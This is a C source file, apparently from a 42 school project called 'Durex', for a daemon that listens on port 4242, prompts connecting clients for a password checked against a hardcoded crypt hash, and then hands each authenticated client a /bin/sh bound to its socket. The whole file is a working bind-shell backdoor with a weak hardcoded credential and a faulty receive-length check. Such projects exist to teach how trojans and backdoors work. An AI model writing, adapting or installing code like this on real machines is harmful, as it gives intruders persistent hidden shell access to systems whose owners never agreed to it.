/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/11/15 19:41:10 by bccyv             #+#    #+#             */
/*   Updated: 2021/11/24 20:54:05 by bccyv            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <syslog.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <durex.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>

#define MAX_CLI_NUMBER 3
#define PORT 4242
#define BUF_SIZE 32
#define PASSWORD_HASH "42ObwopjuwAYY"
#define SALT "42"

int connection_count = 0;
t_cli clients[MAX_CLI_NUMBER] = {0};

/*
 * Disconnects a client and returns his connection fd.
 * Decrements the connection count only if the client isn't logged.
*/
int disconnect_client(t_cli *client)
{
	int confd = client->confd;
	close(client->confd);
	memset(client, 0, sizeof(t_cli));
	connection_count--;
	return (confd);
}

/*
 * Spawns a shell and redirects the standart input / output error to the client
 * socket;
 * Returns -1 on failure, 0 on success.
*/
int spawn_shell(t_cli *client, int sockfd)
{
	int pid;

	pid = fork();
	if (pid < 0)
		return (-1);
	if (pid == 0)
	{
		for (int i = 3; i < sysconf(_SC_OPEN_MAX); i++)
		{
			if (i != client->confd && i != sockfd)
				close(i);
		}
		dup2(client->confd, 0);
		dup2(client->confd, 1);
		dup2(client->confd, 2);
		execve("/bin/sh", (char *[]){"sh", NULL}, NULL);
		exit(EXIT_FAILURE);
	}
	client->shell_pid = pid;
	return (0);
}

/*
 * Check if @buf matches the @hashref.
 * Returns 1 if it does, 0 otherwise.
*/
static int checkpass(char *buf, const char *salt, const char *hashref)
{
	char *hash;
	char *tmp = buf;

	if (buf == NULL || hashref == NULL)
		return (-1);
	while (*tmp && *tmp != '\n')
		tmp++;
	*tmp = '\0';
	hash = crypt(buf, salt);
	return (strcmp(hash, hashref) == 0);
}

/*
 * Read on a client socket.
 * Returns the confd of the client if he disconnects, 0 otherwise.
*/
int read_from_client(t_cli *client, int sockfd)
{
	size_t msg_len;
	char buf[BUF_SIZE] = {0};

	msg_len = recv(client->confd, buf, BUF_SIZE, 0);

	// Client has closed his side of the socket.
	if (msg_len <= 0 || buf[msg_len - 1] != '\n')
	{
		return (disconnect_client(client));
	}

	// TODO: Flush socket buffer.

	if (checkpass(buf, SALT, PASSWORD_HASH))
	{
		spawn_shell(client, sockfd);
		return (client->confd);
	}
	return (0);
}

/*
 * Accepts a connection on @sockfd.
 * If there's already 3 connected clients, it returns or the connection fails,
 * it returns -1. Else it returns the connection fd.
*/
int accept_new_connection(int sockfd)
{
	int confd;

	confd = accept(sockfd, (struct sockaddr *){0}, (socklen_t *){0});
	if (confd < 0)
		return (-1);

	if (connection_count < MAX_CLI_NUMBER)
	{
		for (size_t i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (clients[i].confd == 0)
			{
				clients[i].confd = confd;
				clients[i].is_typing = 0;
				connection_count++;
				return (confd);
			}
		}
	}
	send(confd, "Too many active connections, come back later.\n", 46, 0);
	close(confd);
	return (-1);
}

/*
 *	Server core function.
 *	Uses select I/O multiplexer to accept at most MAX_CLI_NUMBER simultaneous
 *	connections.
*/
int serve(int sockfd)
{
	fd_set rset, wset, rtmp, wtmp;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(sockfd, &rset);

	while (1)
	{
		rtmp = rset;
		wtmp = wset;

		// Remove prompted clients for password from tmp write set
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (clients[i].is_typing)
				FD_CLR(clients[i].confd, &wtmp);
		}

		if (select(FD_SETSIZE, &rtmp, &wtmp, NULL, NULL) < 0)
			continue ;

		// Accept new client
		if (FD_ISSET(sockfd, &rtmp))
		{
			int confd = accept_new_connection(sockfd);
			if (confd > 0)
			{
				FD_SET(confd, &rset);
				FD_SET(confd, &wset);
			}
			continue ;
		}

		// Prompt clients that aren't typing to enter the password
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (clients[i].confd && FD_ISSET(clients[i].confd, &wtmp) && !clients[i].is_typing)
			{
				send(clients[i].confd, "Password: ", 10, 0);
				clients[i].is_typing = 1;
			}
		}

		// Read from clients and updates their state.
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (FD_ISSET(clients[i].confd, &rtmp))
			{
				int confd = read_from_client(&clients[i], sockfd);
				if (confd > 0)
				{
					FD_CLR(confd, &rset);
					FD_CLR(confd, &wset);
				}
				else
				{
					clients[i].is_typing = 0;
				}
			}
		}
	}
	return (0);
}

/*
 * Initializes a socket listening on port @port.
 * Returns the socket fd on success, -1 otherwise.
*/
int sock_init(int port)
{
	int sockfd;
	struct sockaddr_in addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		return (-1);

	memset(&addr, 0, sizeof addr);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(port);

	if (bind(sockfd, (struct sockaddr *)&addr, sizeof addr) < 0 || listen(sockfd, 128) < 0)
	{
		close(sockfd);
		return (-1);
	}
	return (sockfd);
}

void sigchld_handler(int sig)
{
	int pid;

	(void)sig;
	pid = wait(NULL);
	for (int i = 0; i < MAX_CLI_NUMBER; i++)
	{
		if (pid == clients[i].shell_pid)
			disconnect_client(&clients[i]);
	}
}

/*
 *	This program will:
 *	1. Daemonize itself
 *	2. Init and listen on a socket.
 *	3. Ask for a password to clients infinitely.
 *	4. Spawn a shell to logged clients.
*/
int main(void)
{
	int sockfd;

	if (daemon(0, 0) < 0)
		return (1);

	sockfd = sock_init(PORT);
	if (sockfd < 0)
	{
		return (1);
	}

	signal(SIGCHLD, sigchld_handler);

	serve(sockfd);
	close(sockfd);
	return (0);
}
